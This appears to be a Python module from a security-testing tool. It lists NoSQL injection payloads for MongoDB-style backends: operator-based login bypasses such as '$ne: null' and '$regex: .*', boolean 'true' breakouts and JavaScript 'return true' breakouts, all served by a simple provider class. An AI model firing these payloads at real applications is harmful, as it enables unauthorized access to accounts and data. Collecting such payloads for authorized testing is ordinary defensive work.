"""
===============================================================================
NoSQL Injection Payloads
===============================================================================
"""

from __future__ import annotations

from itertools import chain
from typing import Iterable


AUTH_BYPASS = (

    '{"$ne": null}',

    '{"$gt": ""}',

    '{"$regex": ".*"}',

)

BOOLEAN_PAYLOADS = (

    "' || true || '",

    '" || true || "',

)

JAVASCRIPT_PAYLOADS = (

    '"; return true; //',

    "'; return true; //",

)

PAYLOAD_DATABASE = {

    "auth_bypass": AUTH_BYPASS,

    "boolean": BOOLEAN_PAYLOADS,

    "javascript": JAVASCRIPT_PAYLOADS,

}


class NoSQLPayloadProvider:

    def generate(
        self,
        vector,
    ) -> Iterable[str]:

        return chain.from_iterable(
            PAYLOAD_DATABASE.values()
        )